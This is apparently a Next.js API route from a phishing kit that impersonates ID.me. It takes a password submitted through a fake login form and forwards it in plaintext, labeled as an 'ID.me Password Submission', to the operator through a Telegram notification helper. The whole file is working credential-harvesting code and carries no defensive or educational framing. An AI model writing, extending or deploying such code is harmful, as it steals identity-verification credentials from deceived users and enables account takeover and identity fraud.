import { NextResponse } from "next/server";
import { sendTelegramNotification } from "@/app/lib/sendTelegramNotification";

export async function POST(req: Request) {
  try {
    const { password } = await req.json();

    await sendTelegramNotification(
      `🔐 ID.me Password Submission\n\nPassword: ${password}`
    );

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("ID login failed:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
